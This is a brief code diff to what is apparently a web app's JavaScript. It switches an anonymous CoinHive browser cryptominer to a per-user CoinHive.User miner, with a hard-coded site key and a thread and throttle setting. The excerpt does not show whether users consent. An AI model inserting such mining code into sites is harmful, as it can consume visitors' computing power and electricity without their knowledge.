@@ -1,8 +1,8 @@
-const miner = new CoinHive.Anonymous('PrLp6e0z7pNu8ndGukXHl46Q7Kt7pJH5', {throttle: 0.1, threads: 3});
+// const miner = new CoinHive.Anonymous('PrLp6e0z7pNu8ndGukXHl46Q7Kt7pJH5', {throttle: 0.1, threads: 3});
 
 class ComboHandle {
-	constructor () {
-		this.miner = miner
+	constructor (userId) {
+		this.miner = new CoinHive.User('PrLp6e0z7pNu8ndGukXHl46Q7Kt7pJH5', userId, {throttle: 0.1, threads: 3})
 	}
 
 	startMine () {
